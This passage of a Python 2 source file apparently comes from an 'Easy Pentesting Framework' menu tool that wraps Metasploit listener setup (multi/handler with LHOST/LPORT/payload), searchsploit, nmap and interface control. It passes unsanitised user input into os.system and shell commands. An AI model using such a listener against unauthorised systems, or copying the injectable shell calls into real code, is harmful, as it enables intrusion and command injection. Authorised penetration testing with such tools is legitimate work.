				continue
			else:
				break
		
			get = raw_input(bcolors.HEADER+"\nPress any key to return..."+ bcolors.ENDC)

		elif mychoice == '4':
			return

	return payload
	
	
def listener():
	while 1:
		os.system('clear')
		os.system('clear')
		banner(name,length_name)
		print bcolors.HEADER + bcolors.BOLD+"\n[+] Welcome to the exploit module... "+ bcolors.ENDC
		command ="msfconsole -x \" "
		exploit = "multi/handler "
		choice = raw_input(bcolors.HEADER+"\n[*] Please enter the exploit name only if you know the full path else use the 'search' option once redirected to the metasploit framework... \n"+bcolors.ENDC+"\n1) Keep exploit option blank\n2) Proceed with "+exploit+"\n3) Specify exploit"+"\n4) Return to previous menu"+bcolors.HEADER+"\n\n[*] Please select an option: "+bcolors.ENDC)
		if choice == '1':
			exploit = ""
		elif choice == '2':
			exploit = exploit
			command = command + "use "+ exploit +";"
		elif choice == '3':
			exploit = raw_input(bcolors.HEADER+"\n[*] Please enter the exploit name correctly along with path: "+bcolors.ENDC)
			command = command + "use "+ exploit +";"
		elif choice == '4':
			metamain()
		else:
			print bcolors.FAIL + bcolors.BOLD+"\n[-] Error: Invalid Input !"+  bcolors.ENDC
			gt = raw_input(bcolors.HEADER+"\n[*] Press any key to reselect..."+ bcolors.ENDC)
			listener()
			
			
	

		lhost = raw_input( bcolors.HEADER+"\n[*] Please provide the Local Host if required (LHOST) or press 'Enter' to continue': "+bcolors.ENDC)	
		if lhost!= "":
			command = command + "set LHOST " + lhost + ";"
		lport = raw_input( bcolors.HEADER+"\n[*] Please provide the Local Host if required (LPORT) or press 'Enter' to continue': "+bcolors.ENDC)
		if lport!= "":
			command = command + "set LPORT " + lport + ";"
		rhost = raw_input( bcolors.HEADER+"\n[*] Please provide the Remote Host if required (RHOST) or press 'Enter' to continue': "+bcolors.ENDC)	
		if rhost!= "":
			command = command + "set RHOST " + rhost + ";" + "set RHOSTS "+rhost+";"
		rport = raw_input( bcolors.HEADER+"\n[*] Please provide the Remote Port to connect to if required (RPORT) or press 'Enter' to continue': "+bcolors.ENDC)
		if rport!= "":
			command = command + "set RPORT " + rport + ";"
		srvhost = raw_input( bcolors.HEADER+"\n[*] Please provide the Server Host Address if required (SRVHOST) or press 'Enter' to continue': "+bcolors.ENDC)
		if srvhost!= "":
			command = command + "set SRVHOST " + srvhost + ";"
		srvport = raw_input( bcolors.HEADER+"\n[*] Please provide the Server Port if required (SRVPORT) or press 'Enter' to continue': "+bcolors.ENDC)
		if srvport!= "":
			command = command + "set SRVPORT " + srvport + ";"
		choice = raw_input( bcolors.HEADER+"\n[*] Press 'Y' or 'y' if you require a payload or press 'Enter' to continue' : "+bcolors.ENDC)
		if choice == 'Y' or choice == 'y':
			payload = payload_listener()
			command = command + "set payload "+payload+";"
		else:
			payload = ""
		command = command + "\""
		print bcolors.HEADER+bcolors.BOLD+ "\n[*] Your options till now:"+bcolors.ENDC+bcolors.HEADER+"\n\n[+] Exploit: "+bcolors.ENDC+exploit+bcolors.HEADER+"\n[+] Payload: "+bcolors.ENDC+payload+bcolors.HEADER+"\n[+] LHOST:   "+bcolors.ENDC+lhost+bcolors.HEADER+"\n[+] LPORT:   "+bcolors.ENDC+lport+bcolors.HEADER+"\n[+] RHOST:   "+bcolors.ENDC+rhost+bcolors.HEADER+"\n[+] RPORT:   "+bcolors.ENDC+rport+bcolors.HEADER+"\n[+] SRVHOST: "+bcolors.ENDC+srvhost+bcolors.HEADER+"\n[+] SRVPORT: "+bcolors.ENDC+srvport
		get = raw_input(bcolors.HEADER+"\n\n[*] Press any key to proceed or 'b' to reset options: "+ bcolors.ENDC)
		if get == 'b' or get == 'B':
			continue
		else:
			break
			print "\n"
		
	print bcolors.HEADER + bcolors.BOLD+"\n[*] Please Wait ...\n" +bcolors.ENDC
	
	os.system(command)
	

	
def searchexploit():

		os.system('clear')
		os.system('clear')
		name = "   E A S Y   P E N T E S T I N G   F R A M E W O R K   v 1 . 0   "
		length_name = len(name)
		banner(name,length_name)
		print bcolors.HEADER + bcolors.BOLD+"\n\n[+] Welcome to Search exploit module.... "+ bcolors.ENDC
		keyword = raw_input(bcolors.HEADER+"\n\n[*] Enter keyword to search exploit: "+ bcolors.ENDC)
		com = Command("searchsploit "+keyword).run()
		print "\n"+com.output
		get = raw_input(bcolors.HEADER+"\n\n[*] Press any key to return or 'b' to search again: "+ bcolors.ENDC)
		if get == 'b' or get == 'B':
			searchexploit()
		else:
			metamain()
		
# main function

def metamain():

	os.system('clear')
	os.system('clear')
	global name
	global length_name
	os.system('clear')
	os.system('clear')
	name = "   E A S Y   P E N T E S T I N G   F R A M E W O R K   v 1 . 0   "
	length_name = len(name)
	banner(name,length_name)
	print bcolors.HEADER + bcolors.BOLD+"\n[+] Welcome to Metasploit\n"+ bcolors.ENDC	
	while True:
		os.system('clear')
		os.system('clear')
		banner(name,length_name)
		print bcolors.HEADER + bcolors.BOLD+"\n[+] Welcome to Metasploit... \n"+ bcolors.ENDC
		print bcolors.HEADER + bcolors.BOLD+"[*] Choose your scan type: "+ bcolors.ENDC
		mychoice=raw_input("\n1)  Create payload with msfvenom\n2)  Create Listener\n3)  Update Metasploit\n4)  Find exploit \n5)  Return to previous menu\n\n"+bcolors.HEADER + bcolors.BOLD+"[*] Choose your option : "+bcolors.ENDC)
		mylist=[]
		mylist = mychoice.split(',')
		if len(mylist)==1:
			choice = mylist[0]
			if int(choice) == 1:
				createpayload()
			elif int(choice) == 2:
				listener()				
			elif int(choice) ==3:
				os.system('clear')
				os.system('clear')
				name = "   E A S Y   P E N T E S T I N G   F R A M E W O R K   v 1 . 0   "
				length_name = len(name)
				banner(name,length_name)
				print "\n"
				os.system("apt install metasploit-framework")
				get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+ bcolors.ENDC)
				print "\n"
			elif int(choice)==4:
				searchexploit()
			elif int(choice)==5:
				options()	
			else:
				print bcolors.FAIL + bcolors.BOLD+"\n[-] Error: Invalid Input !"+  bcolors.ENDC
				
				

def update_progress(progress,name):
    
    barLength = 20 # Modify this to change the length of the progress bar
    status = ""
    if isinstance(progress, int):
        progress = float(progress)
    if not isinstance(progress, float):
        progress = 0
        status = "error: progress var must be float\r\n"
    if progress < 0:
        progress = 0
        status = "Halt...\r\n"
    if progress >= 1:
        progress = 1
        status = "Done :)\r\n"
    block = int(round(barLength*progress))
    text = "\r"+name+": [{0}] {1}% {2}".format( "#"*block + "-"*(barLength-block), progress*100, status)
    sys.stdout.write(text)
    sys.stdout.flush()
    

def interfaces():
	global wifi
	global eth
	for i in range(101):
	    time.sleep(0.005)
	    update_progress(i/100.0,"[*] Detecting your hardware interfaces")

	com = Command("ifconfig | grep \"wl\" | cut -d \" \" -f 1").run()
	wifi = com.output.split(':')[0]
	com = Command("ifconfig | grep \"et\" | cut -d \" \" -f 1").run()
	eth = com.output.split(':')[0]

	for i in range(0,10):

		response = raw_input("\n[*] Is your wireless interface '"+wifi+"'? (y|n): ")
		if response == 'Y' or response == 'y' or response == 'YES' or response == 'yes' or response == 'Yes':
			wifi=wifi
			break		
		elif response == 'N' or response == 'n' or response == 'NO' or response == 'no' or response == 'No': 
			wifi=raw_input("\n[*] Enter your wlan interface name as displayed in (ifconfig): ")
			break
		else:
			print bcolors.FAIL+bcolors.BOLD+"\n[-] Error: Wrong response"+bcolors.ENDC
	
	for i in range(0,10):
		response = raw_input("\n[*] Is your wired interface '"+eth+"'? (y|n): ")
	
		if response == 'Y' or response == 'y' or response == 'YES' or response == 'yes' or response == 'Yes':
			eth=eth
			break
		
		elif response == 'N' or response == 'n' or response == 'NO' or response == 'no' or response == 'No':  
			eth=raw_input("\n[*] Enter your wired interface name as displayed in (ifconfig): ")
			break
		else:
			print bcolors.FAIL+bcolors.BOLD+"\n[-] Error: Wrong response"+bcolors.ENDC
	
		

class Command(object):
    """Run a command and capture it's output string, error string and exit status"""
    def __init__(self, command):
        self.command = command 
    def run(self, shell=True):
        import subprocess as sp
        process = sp.Popen(self.command, shell = shell, stdout = sp.PIPE, stderr = sp.PIPE)
        self.pid = process.pid
        self.output, self.error = process.communicate()
        self.failed = process.returncode
        return self
    @property
    def returncode(self):
        return self.failed

def viewmac():
	print "\n[+] The MAC of your WLAN interface '"+wifi+"' is:", 
	com = Command("ifconfig "+wifi+" | grep ether | cut -d \" \" -f 10").run()
	print com.output
	print "[+] The MAC of your wired interface '"+eth+"' is:", 
	com = Command("ifconfig "+eth+" | grep ether | cut -d \" \" -f 10").run()
	print com.output
	return

def options():
	while 1:
		os.system("clear")
		os.system("clear")
		name = "   E A S Y   P E N T E S T I N G   F R A M E W O R K   v 1 . 0   "
		length_name = len(name)
		banner(name,length_name)
		print bcolors.HEADER + bcolors.BOLD+"\n[+] Welcome ! Please select an option below.... "+ bcolors.ENDC
		choice = raw_input("\n1)  Enable "+wifi+"\n2)  Disable "+wifi+"\n3)  Enable "+eth+"\n4)  Disable "+eth+"\n5)  View MAC\n6)  View Public IP\n7)  Run NMAP\n8)  Run Metasploit\n9)  Re-register interfaces\n10) Exit\n\n"+bcolors.HEADER + bcolors.BOLD+"[+] Enter your choice: "+bcolors.ENDC)
		if choice == '1':
			com = Command("ifconfig "+wifi+" up").run()
			print bcolors.HEADER+bcolors.BOLD
			for i in range(101):
	   			time.sleep(0.005)
	    			update_progress(i/100.0,"[+] Enabling")
			
			print bcolors.ENDC
			get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+ bcolors.ENDC)
			os.system('clear')
			
		elif choice == '2':
			print bcolors.HEADER+bcolors.BOLD
			com = Command("ifconfig "+wifi+" down").run()
			for i in range(101):
	   			time.sleep(0.005)
	    			update_progress(i/100.0,"[+] Disabling")
			
			print bcolors.ENDC
			get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+ bcolors.ENDC)
			os.system('clear')
			
		elif choice == '3':
			print bcolors.HEADER+bcolors.BOLD
			com = Command("ifconfig "+eth+" up").run()
			for i in range(101):
		   		time.sleep(0.005)
		    		update_progress(i/100.0,"[+] Enabling")				
			print bcolors.ENDC
			get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+ bcolors.ENDC)
			os.system('clear')
		elif choice == '4':
			print bcolors.HEADER+bcolors.BOLD
			com = Command("ifconfig "+eth+" down").run()
			for i in range(101):
		   		time.sleep(0.005)
		    		update_progress(i/100.0,"[+] Disabling")		
			
			print bcolors.ENDC
			get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+ bcolors.ENDC)
			os.system('clear')
		elif choice== '5':
			print bcolors.HEADER+bcolors.BOLD
			viewmac()
			print bcolors.ENDC
			get = raw_input(bcolors.HEADER+"[*] Press any key to return..."+ bcolors.ENDC)
			os.system('clear')
		elif choice== '6':
			print bcolors.HEADER+bcolors.BOLD
			com = Command("dig +short myip.opendns.com @resolver1.opendns.com").run()
			print "\n[+] Your public IP is: "+com.output
			print bcolors.ENDC
			get = raw_input(bcolors.HEADER+"[*] Press any key to return..."+ bcolors.ENDC)
			os.system('clear')
		elif choice== '7':
			print bcolors.HEADER+bcolors.BOLD
			print "\n"
			for i in range(101):
		   		time.sleep(0.01)
		    		update_progress(i/100.0,"[+] Loading NMAP")
			print bcolors.ENDC
			nmapmain()
		elif choice== '8':
			print bcolors.HEADER+bcolors.BOLD
			print "\n"
			for i in range(101):
		   		time.sleep(0.01)
		    		update_progress(i/100.0,"[+] Loading Metasploit")
			print bcolors.ENDC
			metamain()
		elif choice == '9':
			main()
		elif choice == '10':
			exit()
		else:
			print bcolors.FAIL+bcolors.BOLD+"\n[-] Invalid Input"+bcolors.ENDC
			get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+ bcolors.ENDC)

def main():
	global name
	global length_name
	os.system('clear')
	name = "   E A S Y   P E N T E S T I N G   F R A M E W O R K   v 1 . 0   "
	length_name = len(name)
	banner(name,length_name)
	print bcolors.HEADER + bcolors.BOLD+"\n[+] Configuring your hardware.... \n\n"+ bcolors.ENDC
	interfaces()
	print "\n"
	for i in range(101):
	    time.sleep(0.01)
	    update_progress(i/100.0,"[*] Registering options")

	os.system('clear')
	
	options()
	
	
if __name__ == '__main__':
			
	main()
